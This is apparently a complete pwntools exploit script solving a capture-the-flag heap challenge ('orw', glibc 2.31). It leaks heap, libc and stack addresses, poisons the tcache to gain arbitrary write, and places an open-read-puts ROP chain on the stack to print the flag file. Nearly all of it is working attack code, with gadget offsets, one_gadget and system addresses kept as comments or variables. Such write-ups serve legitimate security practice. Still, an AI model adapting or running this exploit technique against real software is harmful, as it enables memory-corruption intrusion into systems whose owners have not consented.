
from pwn import * 
from LibcSearcher import * 
# context.log_level = 'debug' 
context.arch = 'amd64'
p=process('./orw')
# p=remote('t.ctf.qwq.cc',49317)
elf=ELF('./orw')
libc=ELF('./libc-2.31.so')
def add(length,content):
    p.recvuntil(b'>> ')
    p.sendline(b'1')
    p.recvuntil(b'Length of game description:\n')
    p.sendline(str(length).encode())
    p.recvuntil(b'Game description:\n')
    p.sendline(content)
def free(index):
    p.recvuntil(b'>> ')
    p.sendline(b'2')
    p.recvuntil(b'game index: ')
    p.sendline(str(index).encode())
def edit(index,content):
    p.recvuntil(b'>> ')
    p.sendline(b'3')
    p.recvuntil(b'game index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Edit Game description:\n')
    p.sendline(content)
def show(index):
    p.recvuntil(b'>> ')
    p.sendline(b'4')
    p.recvuntil(b'game index: ')
    p.sendline(str(index).encode())
add(0x30,b'./flag\x00')#0
for i in range(7):
    add(0x100,b'./flag\x00')
for i in range(7):
    add(0x50,b'./flag\x00')


add(0x100,b'./flag\x00')#15
add(0x50,b'./flag\x00')#16
add(0x50,b'./flag\x00')#17
for i in range(14):
    free(i+1)
# pause()
show(2)
heap_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(heap_addr))
free(15)
show(15)

main_arena_96=u64(p.recv(6).ljust(8,b'\x00'))
malloc_hook=main_arena_96-0x70
libcbase=malloc_hook-libc.symbols['__malloc_hook']
print('malloc_hook',hex(malloc_hook))
print('libcbase',hex(libcbase))
syscall_addr=0x000000000010E0A5+libcbase
leave_ret=0x00000000000578f8+libcbase
pop_rdi=0x0000000000023b72+libcbase
pop_rsi=0x000000000002604f+libcbase
pop_rax=0x0000000000047400+libcbase
# push_rax=0x0000000000042047+libcbase
pop_rdx_rcx_rbx=0x00000000001025ad+libcbase
mov_rax_rdi=0x000000000005b551+libcbase
mov_rax_rdx=0x0000000000055c75+libcbase

# gadget =0x0000000000001a8c+libcbase
system_addr=libcbase+libc.symbols['system']
free_hook = libcbase+libc.sym["__free_hook"]
puts_addr=libcbase+libc.symbols['puts']
open_addr=libcbase+libc.symbols['open']
read_addr=libcbase+libc.symbols['read']
fopen_addr=libcbase+libc.symbols['fopen']
fgets_addr=libcbase+libc.symbols['fgets']
bin_sh_addr=libcbase+0x00000000001b45bd
one_gadget=libcbase+0xe3b34
setcontext = libcbase + libc.symbols['setcontext']
getkeyserv_handle=libcbase+0x0000000000001441
environ_addr=libcbase+libc.symbols['__environ']
print('open_addr',hex(open_addr))
print('pop_rdi',hex(pop_rdi))
print('pop_rsi',hex(pop_rsi))
print('environ_addr',hex(environ_addr))
print('freehook',hex(free_hook))
print('system',hex(system_addr))
print('setcontext',hex(setcontext))
print('getkeyserv_handle',hex(getkeyserv_handle))
printf_addr=libcbase+libc.symbols['printf']
write_addr=libcbase+libc.symbols['write']
#success
# 0xe3b2e
# 0xe3b31
# 0xe3b34
add(0x30,b'./flag\x00')#18
free(16)
free(17)
# hackloc=malloc_hook-0x38
# print(hex(hackloc))

edit(14,p64(environ_addr-0x10))
add(0x50,b'./flag\x00')#19
add(0x50,b'./flag\x00')#20
edit(20,b'a'*0xf)
show(20)
p.recvuntil(b'a'*0xf+b'\n')
stack_addr=u64(p.recv(6).ljust(8,b'\x00'))
print("stack_addr",hex(stack_addr))
print('stack_before_proaddr',hex(stack_addr-0x220+0x138))
edit(7,p64(stack_addr-0x220+0x138))
add(0x100,b'a'*0xf)#21

add(0x100,b'a'*0xf)#22
# pause()
show(22)
# print(p.recv())
p.recvuntil(b'a'*0xf+b'\n')
pro_addr=u64(p.recv(6).ljust(8,b'\x00')) #程序本身的地址
print("pro_addr",hex(pro_addr))
pro_offset=pro_addr-0x1a30
print("pro_offset",hex(pro_offset))
                                        
buf_addr=pro_offset+0x4060
# pause()
# context.log_level = 'debug' 
add(0x30,b'./flag\x00')#23                  #success

add(0x10,b'r\x00')#24
free(0)
free(23)
edit(23,p64(buf_addr+0x10))
print('buf_addr+8*25',hex(buf_addr+8*25))
add(0x30,b'flag\x00\x00\x00\x00')#25
print("under_rbp",hex(stack_addr-0x230))
add(0x30,p64(stack_addr-0x230)+p64(environ_addr-0x10))#26 #得到最有用的控制权，任意地址写
# pause()
edit(3,p64(0)*5+b'\x00')            #success
# pause()
# p.interactive()
# rop_link=flat([ pop_rdi,buf_addr+8*25,puts_addr])
# rop_link=flat([ 
#                pop_rsi,buf_addr+8*24, pop_rdi,buf_addr+8*25,fopen_addr,mov_rax_rdx,pop_rsi,100,pop_rdi,buf_addr+8*27,fgets_addr ,pop_rdi,buf_addr+8*27,puts_addr,pop_rdi,buf_addr+8*25,puts_addr])
read_plt=elf.plt['read']+pro_offset
printf_plt=elf.plt['printf']+pro_offset
puts_plt=elf.plt['puts']+pro_offset
# rop_link=flat([\
#     pop_rdi,buf_addr+8*25,pop_rsi,4,open_addr,  \
#     mov_rax_rdi,pop_rsi,buf_addr+8*27, pop_rdx_rcx_rbx,0x30,0x30,0x30,read_addr,\
#     pop_rdi,buf_addr+8*25,puts_addr,pop_rdi,buf_addr+8*27,puts_addr])
print(hex(puts_plt))
context.log_level = 'debug' 
# rop_link=flat([pop_rax,0,pop_rdi,buf_addr+8*25,pop_rsi,4, open_addr,mov_rax_rdi, pop_rsi,buf_addr+8*27,pop_rdx_rcx_rbx,20,20,20,pop_rax,0,read_addr, pop_rdi,buf_addr+8*27,puts_addr,pop_rdi,buf_addr+8*25,puts_addr])
# open
rop_link = p64(pop_rdi)+p64(buf_addr+8*25)+p64(pop_rsi)+p64(0)+p64(open_addr)
# read
rop_link+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0xb50)+p64(pop_rdx_rcx_rbx)+p64(0x30)*3+p64(read_addr)
# puts
rop_link+= p64(pop_rdi)+p64(heap_addr+0xb50)+p64(puts_addr)
rop_link+= p64(pop_rdi)+p64(heap_addr+0xb50)+p64(puts_addr)
# rop_link+=p64(main_addr)
# rop_link=flat([
#     pop_rax,2,pop_rdi,buf_addr+8*25,syscall_addr, \
#     pop_rdi,buf_addr+8*25,puts_addr
# ])
# 
pause()
edit(2,rop_link)#这段rop被放在rbp下面
# print(p.recv())
pause()
# rop_link=flat([pop_rdi,stack_addr-0x220,pop_rsi,0,0,system_addr])
# edit(22,b'a')


# free(19)
p.interactive()
